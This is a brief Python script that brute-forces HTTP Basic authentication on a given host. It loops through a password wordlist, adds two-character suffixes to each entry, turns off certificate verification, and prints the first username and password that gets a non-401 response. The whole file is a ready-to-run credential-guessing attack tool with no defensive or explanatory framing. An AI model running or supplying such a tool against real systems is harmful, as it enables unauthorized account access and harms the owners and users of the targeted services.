#!/usr/bin/python

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from requests.auth import HTTPBasicAuth

import string
import sys

h=str(sys.argv[1])
usr=str(sys.argv[2])
with open(sys.argv[3]) as pfile:
    pwds = pfile.read().splitlines()

suffix="1234567890!@#$%^&*()_+="
def brute(host,user,passwords):
    print("Guessing passwords for " + user + " on " + host + "...")

    for p in passwords:
        for s1 in suffix:
            for s2 in suffix:
                guess = p+s1+s2
                response = requests.get(host, auth=HTTPBasicAuth(user, guess), verify=False)
                if response.status_code != 401:
                    print(user + ":" +  guess + " : " + str(response.status_code))
                    return

brute(h,usr,pwds)
